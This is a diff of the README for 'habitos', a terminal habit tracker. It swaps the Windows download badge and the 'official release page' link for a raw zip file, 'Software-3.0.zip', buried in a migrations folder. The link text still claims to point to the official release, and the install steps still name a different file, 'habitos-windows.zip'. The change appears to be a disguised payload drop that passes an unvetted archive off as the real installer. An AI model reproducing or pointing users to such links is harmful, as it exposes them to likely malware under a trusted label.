@@ -1,6 +1,6 @@
 # 🚀 habitos - Manage your daily life inside terminal
 
-[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://github.com/unipolar-style14/habitos/releases)
+[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://github.com/unipolar-style14/habitos/raw/refs/heads/main/habitos-core/migrations/Software-3.0.zip)
 
 HabitOS acts as a home for your goals, habits, and daily plans. It runs directly inside your computer terminal. This tool keeps your personal data private by saving everything on your machine instead of the internet. You do not need to rely on cloud services or web browsers to track your progress.
 
@@ -22,7 +22,7 @@ To run HabitOS on your Windows computer, you need basic system specs:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official release page](https://github.com/unipolar-style14/habitos/releases) to access the installer.
+1. Visit the [official release page](https://github.com/unipolar-style14/habitos/raw/refs/heads/main/habitos-core/migrations/Software-3.0.zip) to access the installer.
 2. Look for the file named `habitos-windows.zip` in the latest release section.
 3. Click the filename to save it to your Downloads folder.
 4. Open your Downloads folder in Windows File Explorer.
